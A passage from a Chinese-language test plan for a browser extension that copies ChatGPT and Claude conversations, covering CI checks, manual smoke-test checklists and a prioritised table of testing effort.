    - pnpm typecheck                # 类型检查
    - pnpm test                     # 全量 vitest 测试
    - pnpm test:coverage            # 覆盖率报告（不设阈值门禁，只做参考）

# 新 adapter PR 触发的额外检查：
adapter-review:
  steps:
    - 检查 manifest 通过 Zod 验证
    - 检查 urlTemplate 域名在 hostPermissions 范围内
    - 如果有钩子函数，标记 "needs-security-review" label
```

---

## 9. 手动烟测清单

### 9.1 每个迁移阶段后的基本烟测

在 Chrome 浏览器中手动执行：

**ChatGPT 烟测**：
- [ ] 打开 ChatGPT，进入一个对话页面
- [ ] 验证 copy button 出现在标题栏
- [ ] 点击 copy button，粘贴到文本编辑器验证内容正确
- [ ] 侧边栏列表项 hover 时出现 copy icon
- [ ] 点击 list copy icon，验证复制正确
- [ ] 进入 batch mode，选择 2-3 个对话，批量复制
- [ ] 切换 format（full/compact/code-only/user-only）验证输出
- [ ] 从一个对话导航到另一个对话，验证按钮重新注入

**Claude 烟测**：
- [ ] 打开 Claude，进入一个对话页面
- [ ] 验证 copy button 出现在标题栏
- [ ] 点击 copy button，粘贴验证内容正确（特别注意 artifact 转换）
- [ ] 侧边栏列表项 hover 时出现 copy icon
- [ ] batch mode 工作正常
- [ ] 连续同角色消息是否正确合并

### 9.2 发布前全量烟测

在基本烟测基础上增加：

- [ ] 含代码块的对话（Python、JavaScript、Rust）
- [ ] 含图片/DALL-E 的对话（ChatGPT）
- [ ] 含 artifact 的对话（Claude）
- [ ] 长对话（50+ 消息）
- [ ] Markdown 特殊字符（标题含 `:` `"` `#`）
- [ ] 多标签页同时使用
- [ ] 扩展安装后首次使用（无 token 缓存）
- [ ] 网络断开后重连

---

## 10. 总结：测试投入优先级

| 优先级 | 投入 | 预估工时 | 产出 |
|--------|------|---------|------|
| **P0** | `getByPath` + `resolveTemplate` 单元测试 | 2h | 20-25 个测试 |
| **P0** | `AdapterManifestSchema` 验证测试 | 3h | 30-40 个测试 |
| **P0** | API 响应 fixture 收集和脱敏 | 2h | 8-10 个 fixture 文件 |
| **P0** | 旧 adapter 金标准输出快照 | 1h | 8-10 个 snapshot |
| **P1** | ManifestAdapter 引擎测试（mocked） | 4h | 30-40 个测试 |
| **P1** | Phase 3 对比测试 | 2h | 10-15 个测试 |
| **P1** | ManifestInjector DOM 测试 | 2h | 15-20 个测试 |
| **P1** | 安全审查清单制定 | 1h | 1 份清单文档 |
| **P2** | Registry 测试 | 1h | 5-10 个测试 |
| **P2** | 选择器健康检查脚本 | 1h | 1 个脚本 |
| **P2** | CI 集成 | 2h | workflow 配置 |

**总计**：约 20 小时工作量，产出 120-160 个自动化测试 + 完整的手动测试清单。

### 核心原则重申

1. **不追求 100% 覆盖率**。覆盖率是 vanity metric。一个 90% 覆盖率但没有测试 `getByPath` 边界条件的测试套件，比一个 60% 覆盖率但全面覆盖了核心工具函数和解析管线的测试套件要差。

2. **测试是为了提供信息，不是为了"通过"**。当一个测试失败时，它的价值在于告诉我们"这里有变化"，而不是"这里有 bug"。变化可能是预期的（API 更新），测试的价值在于让我们意识到变化。

3. **一人公司的测试策略和大公司不同——这是对的**。我们不需要 QA 团队、不需要测试环境矩阵、不需要 nightly regression suite。我们需要的是：核心路径的自动化 checking + 创始人每天 dogfooding 的探索性 testing。

---

*产出人: QA 总监 (James Bach 思维模型)*
*日期: 2026-02-07*
